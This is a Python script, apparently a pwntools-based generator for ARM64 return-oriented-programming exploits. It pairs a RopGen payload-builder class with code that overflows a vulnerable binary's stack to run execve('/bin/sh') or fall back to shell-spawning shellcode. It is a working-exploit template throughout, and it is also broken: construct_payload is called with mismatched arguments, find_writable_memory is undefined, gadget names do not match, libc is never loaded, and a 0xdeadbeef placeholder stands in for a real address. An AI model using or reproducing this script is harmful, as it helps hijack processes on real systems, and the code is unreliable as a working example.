import os
import argparse
import sys
from pwn import *

from struct import pack
from io import StringIO


class RopGen():
    def __init__(self, endian = 'le', padding = 'A', total_length = 0):
        """
        Constructior

        :param endian: The Endianess, can be big (be) or little endian (le)
        :type endian: string

        :param padding: The filler character to be used for the exploit string
        :type padding: string

        :param total_length: The final length of the generated rop string. If this is not specified,
                            length the rop string is as big as it is necessary to encompass all values.

        :type total_length: integer
        """

        if endian != 'le' and endian != 'be':
            raise Exception('Incorrect endian specified, can be one of big (be) or little (le).')
        if len(padding) != 1:
            raise Exception('Padding byte can consist of only 1 character.')

        self.endian = endian
        self.padding = padding
        self.map = {}
        self.total_length = total_length
        self.desc_table = None


    def set_byte(self, pos, byte, desc = ''):
        """
        Sets a byte value at the specified position

        :param pos: The position where the byte will be placed
        :type pos: integer

        :param byte: The byte value
        :type byte: integer

        :param desc: Description string
        :type desc: string
        """
        
        self.map[pos] = pack('<B', byte), desc


    def set_word(self, pos, word, desc = ''):
        """
        Sets a word (2 bytes) value at the specified position

        :param pos: The position where the word will be placed
        :type pos: integer

        :param word: The word value 
        :type word: integer

        :param desc: Description string
        :type desc: string
        """

        if self.endian == 'le':
            self.map[pos] = pack('<H', word), desc
        elif self.endian == 'be':
            self.map[pos] = pack('>H', word), desc


    def set_dword(self, pos, dword, desc = ''):
        """
        Sets a dword (4 bytes) value at the specified position

        :param pos: The position where the dword will be placed
        :type pos: integer

        :param dword: The dword value 
        :type dword: integer

        :param desc: Description string
        :type desc: string
        """     

        if self.endian == 'le':
            self.map[pos] = pack('<L', dword), desc
        elif self.endian == 'be':
            self.map[pos] = pack('>L', dword), desc


    def set_qword(self, pos, qword, desc = ''):
        """
        Sets a quad word (8 bytes) value at the specified position

        :param pos: The position where the qword will be placed
        :type pos: integer

        :param qword: The dword value 
        :type qword: integer

        :param desc: Description string
        :type desc: string
        """     

        if self.endian == 'le':
            self.map[pos] = pack('<Q', qword), desc
        elif self.endian == 'be':
            self.map[pos] = pack('>Q', qword), desc


    def set_string(self, pos, sval, desc = ''):
        """
        Sets a string at the specifed position

        :param pos: The position where the string will be placed
        :type pos: integer

        :param string: The string value 
        :type sval: string

        :param desc: Description string
        :type desc: string
        """        

        self.map[pos] = sval, desc


    def build(self):
        """
        Generates and returns the rop string.

        :return: Generated rop string
        :rtype: string
        """
        curr_offs = 0
        self.desc_table = []
        buffer = StringIO()

        for pos in sorted(self.map):
            if curr_offs > pos:
                raise Exception("Parts of the rop string overlap. Please recheck")

            elif curr_offs == pos:
                val, desc = self.map[pos][0], self.map[pos][1]
                self.desc_table.append((curr_offs, desc, len(val)))
                buffer.write(str(val))
                curr_offs += len(val)

            elif curr_offs < pos:
                num_padding_bytes = pos - curr_offs
                buffer.write(self.padding * num_padding_bytes)
                self.desc_table.append((curr_offs, 'Padding Bytes', num_padding_bytes))
                curr_offs = pos

                val, desc = self.map[pos][0], self.map[pos][1]
                self.desc_table.append((curr_offs, desc, len(val)))
                buffer.write(str(val))
                curr_offs += len(val)

        # Pad with filler bytes
        if curr_offs < self.total_length:
            num_padding_bytes = self.total_length - curr_offs
            buffer.write(self.padding * num_padding_bytes)
            self.desc_table.append((curr_offs, 'Padding Bytes', num_padding_bytes))

        return buffer.getvalue()        


    def summarize(self):
        """
        Summarizes the rop string in the form of a nice table.

        :return: Generated table
        :rtype: string
        """

        from texttable import Texttable

        if self.desc_table:
            table = Texttable()

            table.set_cols_align(["l", "l", "c"])
            table.header(["Offset", "Content description", "Length in bytes"])
            for e in self.desc_table:
                table.add_row([e[0], e[1], e[2]])

            return table.draw()

# Argument Parser Setup
parser = argparse.ArgumentParser(description="Automated ROP Exploit Generator for ARM64 Binaries")
parser.add_argument("--binary", required=True, help="Path to the vulnerable binary (ARM64).")
parser.add_argument("--command", default="/bin/sh", help="Command to execute with execve.")
parser.add_argument("--output", default="exploit_payload", help="Path to output the generated exploit payload.")
args = parser.parse_args()

# Setup Context
context.arch = 'aarch64'
context.os = 'linux'
context.log_level = 'info'

def get_gadgets(elf):
    """
    Retrieves gadget addresses from the ELF binary.
    """
    gadgets = {}
    required_gadgets = [
        'ldp_x0_x1_ret',
        'ldp_x1_x2_ret',
        'ldr_x0_ret',
        'str_x1_x0_ret'
    ]

    for gadget in required_gadgets:
        try:
            addr = elf.symbols[gadget]
            gadgets[gadget] = addr
            log.info(f"Gadget '{gadget}' found at address: {hex(addr)}")
        except KeyError:
            log.error(f"Gadget '{gadget}' not found in the binary.")
            sys.exit(1)

    return gadgets

def find_offset():
    """
    Returns the known offset to overwrite the return address.
    Based on buffer size of 128 bytes and typical stack frame.
    """
    buffer_size = 128
    saved_fp_size = 8  # x29
    return_addr_size = 8  # x30
    offset = buffer_size + saved_fp_size + return_addr_size
    log.info(f"Assumed buffer overflow offset: {offset} bytes")
    return offset

def construct_payload(offset, binary_path, libc, cmd_args, gadgets):
    """
    Constructs the exploit payload using the RopGen class.
    """
    # Initialize RopGen with little-endian format and padding
    rop = RopGen(endian='le', padding='A', total_length=1024)

    # Add padding to reach the return address
    rop.set_string(0, b'A' * offset, desc="Padding to overwrite saved return address")

    # Fallback to stack-based shellcode execution
    writable_addr = find_writable_memory(binary_path, offset)
    if writable_addr == "stack":
        shellcode = asm(shellcraft.sh())
        rop.set_string(offset, shellcode, desc="Shellcode for spawning a shell")
        rop.set_qword(offset + len(shellcode), 0xdeadbeef, desc="Stack address pointing to shellcode")  # Replace with actual stack address
        return rop.build()

    # Write command-line arguments to writable memory
    cmd_strings = [arg.encode() + b'\x00' for arg in cmd_args]
    cmd_lengths = [len(s) for s in cmd_strings]
    arg_addresses = [writable_addr + sum(cmd_lengths[:i]) for i in range(len(cmd_lengths))]

    for addr in arg_addresses:
        if b'\x00' in p64(addr):
            log.error(f"Writable memory address contains null bytes: {arg_addresses}")
            sys.exit(1)

    for idx, (arg, addr) in enumerate(zip(cmd_strings, arg_addresses)):
        rop.set_string(addr, arg, desc=f"Command-line argument {idx}")

    # Set up argv array
    argv_array_addr = writable_addr + sum(cmd_lengths) + 0x100
    for idx, addr in enumerate(arg_addresses):
        rop.set_qword(argv_array_addr + idx * 8, addr, desc=f"argv[{idx}] address")

    rop.set_qword(argv_array_addr + len(arg_addresses) * 8, 0, desc="NULL terminator for argv")

    # Set up execve syscall
    rop.set_qword(offset, gadgets['ldp x0, x1; ret'], desc="Gadget: ldp x0, x1; ret")
    rop.set_qword(offset + 8, arg_addresses[0], desc="x0: Pointer to command")
    rop.set_qword(offset + 16, argv_array_addr, desc="x1: Pointer to argv array")
    rop.set_qword(offset + 24, libc.symbols['execve'], desc="Call to execve")

    # Return the built payload
    return rop.build()


def main():
    """Main execution flow."""
    # Load the binary ELF using pwntools
    try:
        binary_elf = ELF(args.binary)
    except FileNotFoundError:
        log.error(f"Binary '{args.binary}' not found.")
        sys.exit(1)

    # Ensure the binary is 64-bit ARM (AArch64)
    if binary_elf.arch != 'aarch64':
        log.error("The provided binary is not for ARM64 architecture.")
        sys.exit(1)
    log.info(f"Loaded binary '{args.binary}' with architecture: {binary_elf.arch}")

    # Retrieve gadget addresses
    gadgets = get_gadgets(binary_elf)

    # Find the offset
    offset = find_offset()

    # Construct the payload
    payload = construct_payload(offset, gadgets, binary_elf, args.command)

    # Write the payload to the output file
    with open(args.output, 'wb') as f:
        f.write(payload)
    log.success(f"Payload written to {args.output}")

if __name__ == "__main__":
    main()
